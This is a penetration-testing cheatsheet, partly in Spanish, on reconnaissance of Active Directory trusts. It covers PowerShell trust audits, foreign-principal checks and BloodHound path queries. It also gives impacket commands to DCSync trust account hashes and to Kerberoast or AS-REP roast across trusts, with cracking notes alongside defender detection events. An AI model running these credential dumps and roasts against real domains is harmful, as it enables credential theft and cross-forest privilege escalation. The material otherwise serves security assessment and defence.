---
aliases:
  - Trust Attack Recon
  - Cross-Forest Recon
  - Foreign Group Audit
  - Trust Account Discovery
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Domain & Forest Trusts]]"
  - "[[Trust Abuse]]"
---
# AD - Domain & Forest Trusts - Trust Recon para Ataques

***

## Identify Attackable Trust Surfaces

| **Surface** | **Detection** | **Notas** |
|:---:|:---:|:---:|
| Outbound bidirectional trusts | Direction = BiDirectional | Foreign attackers exposed. |
| Trusts with TGT delegation enabled (legacy) | trustAttributes & 0x800 | Cross-forest UD risk. |
| Trusts without SID filtering | trustAttributes & 0x4 missing | Cross-forest privesc. |
| Trusts with stale passwords | `lastTrustExchangeTime` old | Crackable. |
| Trusts with weak trust password | Brute candidate | Edge. |
| Forest trusts (transitive scope) | TRUST_ATTRIBUTE_FOREST_TRANSITIVE | Wide blast. |
| External trusts (often non-transitive) | Limited scope | Defense indicator. |
| Trusts to known-vulnerable forests | Public CVE matched | Specific. |
| Trusts to vendors/partners | Cross-org attack vector | Common. |
| Cloud trust (Azure AD Connect) | Hybrid identity | Modern. |
| Realm trust (Linux KDC) | Cross-platform | Edge. |
| Selective Auth disabled | Bypass simple | Common. |
| Allowed-To-Authenticate ACE on critical resources | Foreign access path | Audit. |
| Foreign principals in privileged groups | Cross-trust escalation | Critical. |
| sIDHistory abuse pre-existing | Migration leftover | Audit. |
| Cross-forest with Schema Admins | Forest-wide schema mod | Critical. |
^ad-trustrecon-surfaces

### Surface audit script

```powershell
Get-ADTrust -Filter * -Properties * | ForEach-Object {
  [PSCustomObject]@{
    TrustName = $_.Name
    Source = $_.Source
    Target = $_.Target
    Direction = $_.Direction
    TrustType = $_.TrustType
    Transitive = $_.IsTransitive
    ForestTransitive = $_.ForestTransitive
    SelectiveAuth = $_.SelectiveAuthentication
    SIDFilteringEnabled = ($_.trustAttributes -band 0x4) -ne 0
    TGTDelegationEnabled = ($_.trustAttributes -band 0x800) -ne 0
    Risk = $(
      $score = 0
      if ($_.Direction -eq "BiDirectional") { $score += 2 }
      if ($_.IsTransitive) { $score += 2 }
      if (-not $_.SelectiveAuthentication) { $score += 2 }
      if (-not (($_.trustAttributes -band 0x4) -ne 0)) { $score += 3 }  # No SID Filter = HIGH
      if (($_.trustAttributes -band 0x800) -ne 0) { $score += 3 }  # TGT Delegation = HIGH
      if ($score -ge 7) {"CRITICAL"}
      elseif ($score -ge 4) {"HIGH"}
      elseif ($score -ge 2) {"MEDIUM"}
      else {"LOW"}
    )
  }
} | Sort Risk -Descending
```

___

## Foreign Group Membership Audit

| **Vector** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Foreign users in local groups | `Find-ForeignUser` (PowerView) | Cross-trust enum. |
| Foreign groups in local groups | `Find-ForeignGroup` (PowerView) | Same. |
| Foreign principals in DA | Critical | DA cross-trust. |
| Foreign principals in EA | Forest-wide critical | Forest. |
| Foreign service accounts | Often privileged | Audit. |
| Cross-forest universal groups | Forest-wide membership | Standard. |
| ForeignSecurityPrincipals container | `CN=ForeignSecurityPrincipals,DC=...` | LDAP location. |
| Resolve FSP SIDs | `Get-ADObject -Filter` + `Translate` | Resolution. |
| BloodHound foreign group queries | Cypher | Visual. |
| Indirect via nested groups | Foreign user in Group A in Group B in DA | Recursive. |
| Audit recursive cross-trust paths | `Get-ADGroupMember -Recursive` | Standard. |
| Suspicious if many foreign in priv groups | Defender concern | Audit. |
| Removal cleanup post-migration | Standard hygiene | Post-merger. |
| Pre-merger audit | Identify before merge | Compliance. |
| Post-merger audit | Verify after migration | Compliance. |
| Detection: foreign membership change events | Defender | Standard. |
^ad-trustrecon-foreign

### Foreign principals audit

```powershell
# Foreign Security Principals in current domain
Get-ADObject -SearchBase "CN=ForeignSecurityPrincipals,DC=dom,DC=local" -Filter * |
  Select Name,DistinguishedName

# Resolve FSP SIDs to names (if domain reachable)
Get-ADObject -SearchBase "CN=ForeignSecurityPrincipals,DC=dom,DC=local" -Filter * | 
  ForEach-Object {
    $sid = $_.Name
    try {
      $resolved = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount])
      [PSCustomObject]@{ SID = $sid; Name = $resolved }
    } catch {
      [PSCustomObject]@{ SID = $sid; Name = "UNRESOLVABLE" }
    }
  }

# PowerView
Find-ForeignUser
Find-ForeignGroup

# Foreign principals in privileged groups
$privGroups = @("Domain Admins","Enterprise Admins","Schema Admins","Administrators")
foreach ($g in $privGroups) {
  Get-ADGroupMember $g -Recursive | Where {$_.distinguishedName -match "ForeignSecurityPrincipals"}
}
```

___

## Cross-Trust Reachability Mapping

| **Tool** | **Use** | **Notas** |
|:---:|:---:|:---:|
| BloodHound (cross-domain ingest) | Visual paths | Best for graphs. |
| BloodHound trust collection | `-c Trusts` per domain | Required. |
| Multiple SharpHound runs | One per domain | Sequential. |
| RustHound trust support | Built-in | Modern. |
| Cypher cross-trust paths | `MATCH p=shortestPath(...)` | Custom. |
| `Get-DomainTrustMapping` walks reachable | PowerView | CLI alternative. |
| Network reachability matters | Trust visible ≠ reachable | Standard. |
| Per-DC reachability | Forward proxy / pivot | Operational. |
| Cross-trust LDAP query | Authenticated cross-domain | Standard. |
| Cross-trust SMB | Foreign DC SYSVOL | Edge. |
| Cross-trust auth pre-check | `runas /netonly` | Test. |
| BloodHound foreign user tracking | `MATCH (u:User) WHERE u.domain="A"` | Standard. |
| Trust path cost | Manual estimation | Strategic. |
| Multi-hop trust chain | A→B→C transitive | Edge. |
| Cycle detection in Cypher | `WHERE NONE(...)` | Edge. |
| Cloud forest extension (Azure AD) | Hybrid path | Modern. |
^ad-trustrecon-mapping

### BloodHound cross-trust queries

```cypher
// Map all reachable domains via trust
MATCH (a:Domain)-[r:Trusts]->(b:Domain)
RETURN a.name AS From, b.name AS To, r.direction AS Direction, r.istransitive AS Transitive

// Find paths from any owned principal in any domain to DA in any domain
MATCH (u {owned: true})
MATCH (g:Group)
WHERE g.name CONTAINS "DOMAIN ADMINS"
MATCH p=shortestPath((u)-[*1..]->(g))
RETURN p

// Cross-trust ACL paths (high-value)
MATCH (u:User)
WHERE u.owned = true
MATCH (target {highvalue: true})
WHERE u.domain <> target.domain
MATCH p=shortestPath((u)-[*1..15]->(target))
RETURN p
```

___

## Trust Account Discovery (DCSync Targets)

| **Vector** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Trust account user objects | `(UserAccountControl & 2048)` filter | LDAP. |
| Search by class | `(objectClass=trustedDomain)` for TDO | Adjacent. |
| Search by name pattern | `<NETBIOS>$` user accounts | ID. |
| `Get-ADUser -Filter {UserAccountControl -band 2048}` | RSAT direct | Standard. |
| INTERDOMAIN_TRUST_ACCOUNT UAC flag | 0x800 / 2048 | LDAP. |
| Per-trust account | One user per trust direction | Standard. |
| DCSync to dump | Privileged required | Standard. |
| `secretsdump -just-dc` | Dump all hashes including trust | Standard. |
| Filter for trust accounts in dump | grep `\$:` patterns | Post-process. |
| Trust account hash crack | Like krbtgt | Theoretical. |
| Forge inter-realm TGT | Use trust hash | Attack. |
| Cross-trust TGS request manipulation | Edge | Adjacent. |
| BloodHound trust account edges | Custom modeling | Adjacent. |
| Detection: DCSync events 4662 | Defender | Standard. |
| Detection: trust account auth anomaly | Defender ML | Modern. |
| Microsoft Defender for Identity | Trust account abuse alerts | Defender. |
^ad-trustrecon-tdo

### Trust account dump

```bash
# DCSync (privileged)
impacket-secretsdump dom-A.local/admin:pass@DC -just-dc

# Output includes trust accounts:
# PARTNER$:1234:aad3b435b51404eeaad3b435b51404ee:abcdef...:::
# 
# Format: <TrustAccountName>:RID:LM_HASH:NT_HASH:::

# Filter for trust accounts (UAC flag 2048)
impacket-secretsdump dom-A.local/admin:pass@DC -just-dc | grep '\$:'
```

```powershell
# RSAT detection
Get-ADUser -Filter {UserAccountControl -band 2048} -Properties UserAccountControl,SamAccountName,Description |
  Select SamAccountName,Description
```

___

## Cross-Trust Kerberoast / AS-REP

| **Attack** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Cross-trust Kerberoast | `GetUserSPNs.py -target-domain dom-B.local dom-A/u:p` | Adjacent hub. |
| Cross-trust AS-REP roast | `GetNPUsers.py -target-domain dom-B.local dom-A/u:p -no-pass` | Adjacent hub. |
| Required: outbound trust direction | Local user can request foreign tickets | Standard. |
| Trust transitive | Forest-wide reachable | Adjacent. |
| Service accounts cross-trust | Common high-value | Adjacent. |
| Pre-auth disabled foreign accounts | AS-REP target | Adjacent. |
| Hash crack same as native | hashcat | Standard. |
| Cross-trust foreign GC query | Discover SPNs | Adjacent. |
| `setspn -T <foreign-dom> -Q */*` | Native | Adjacent. |
| Mass enum across all reachable forests | Trust mapping + roast | Comprehensive. |
| Cross-trust Kerberoast harder than intra | Higher noise + detection | Operational. |
| Detection: Event 4769 (TGS request) cross-realm | Defender | Standard. |
| Detection: ms-srv-realm in TGS | Anomaly | Defender. |
| Hash isolation: per-domain | Foreign hash != local | Standard. |
| Forging differs cross-realm | Inter-realm TGT signing | Different. |
| Adjacent hubs | [[Kerberoasting]], [[AS-REP Roasting]] | Cross-ref. |
^ad-trustrecon-roast

### Cross-trust Kerberoast

```bash
# Get SPNs in foreign domain (requires outbound trust + auth)
impacket-GetUserSPNs -target-domain dom-B.local dom-A.local/user:pass@DC-A -dc-ip DC-A -request

# Output: TGS hashes for foreign service accounts
# Crack with hashcat -m 13100

# Cross-trust AS-REP
impacket-GetNPUsers -target-domain dom-B.local dom-A.local/user:pass@DC-A -no-pass -usersfile foreign_users.txt
```

***
